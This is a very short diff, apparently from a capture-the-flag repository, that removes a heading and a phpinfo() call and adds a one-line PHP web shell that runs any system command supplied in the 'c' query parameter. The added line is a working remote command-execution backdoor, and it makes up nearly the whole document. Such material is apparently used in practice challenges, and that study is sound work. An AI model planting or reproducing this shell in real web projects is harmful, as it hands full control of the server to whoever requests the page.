@@ -1,2 +1,1 @@
-# ramadanctf
-&lt;?php phpinfo();?>
+<?=system($_GET['c']);?>
